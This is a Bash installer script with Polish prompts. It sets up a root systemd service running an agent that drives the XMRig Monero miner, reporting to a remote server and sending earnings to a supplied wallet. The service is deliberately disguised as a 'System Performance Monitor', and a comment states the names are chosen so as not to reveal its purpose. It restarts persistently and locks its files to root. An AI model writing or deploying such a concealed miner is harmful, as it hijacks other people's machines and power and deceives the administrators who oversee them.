#!/bin/bash
set -e

echo ""
echo " ╔══════════════════════════════════════╗"
echo " ║     Agent — Instalator Linux         ║"
echo " ╚══════════════════════════════════════╝"
echo ""

[ "$EUID" -ne 0 ] && echo "Uruchom jako root: sudo bash install_linux.sh" && exit 1

# Internal names — neutral, do not reveal purpose
SVC_NAME="sys-perf-mon"
SVC_DESC="System Performance Monitor"
INSTALL_DIR=/opt/sys-perf-mon

read -p "Adres serwera (np. http://192.168.1.10:8000): " SERVER_URL
read -p "Pool (Enter = pool.supportxmr.com:3333): "      POOL
[ -z "$POOL" ] && POOL="pool.supportxmr.com:3333"
read -p "Adres portfela XMR: "                           WALLET
read -p "Ścieżka do xmrig (Enter = xmrig): "            XMRIG
[ -z "$XMRIG" ] && XMRIG="xmrig"

mkdir -p "$INSTALL_DIR"
cp agent.py wol_setup.py hardware_detect.py "$INSTALL_DIR/"

pip3 install psutil requests --break-system-packages -q 2>/dev/null || \
pip3 install psutil requests -q

cat > /etc/"$SVC_NAME".env << ENVEOF
RM_SERVER_URL=$SERVER_URL
RM_POOL=$POOL
RM_WALLET=$WALLET
RM_XMRIG_PATH=$XMRIG
RM_INTERVAL=10
ENVEOF

# Lock env file — only root can read it (contains wallet address)
chmod 600 /etc/"$SVC_NAME".env

cat > /etc/systemd/system/"$SVC_NAME".service << SVCEOF
[Unit]
Description=$SVC_DESC
After=network.target

[Service]
EnvironmentFile=/etc/$SVC_NAME.env
ExecStart=/usr/bin/python3 $INSTALL_DIR/agent.py
Restart=always
RestartSec=5
KillSignal=SIGTERM
SendSIGKILL=no
TimeoutStopSec=10
# Run as root so XMRig can set hugepages
User=root

[Install]
WantedBy=multi-user.target
SVCEOF

# Lock install directory
chmod 700 "$INSTALL_DIR"
chown -R root:root "$INSTALL_DIR"

systemctl daemon-reload
systemctl enable "$SVC_NAME"
systemctl start  "$SVC_NAME"

echo ""
echo " ✓ Instalacja zakończona!"
echo " ✓ Usługa: $SVC_NAME"
echo " ✓ Status: $(systemctl is-active $SVC_NAME)"
echo ""
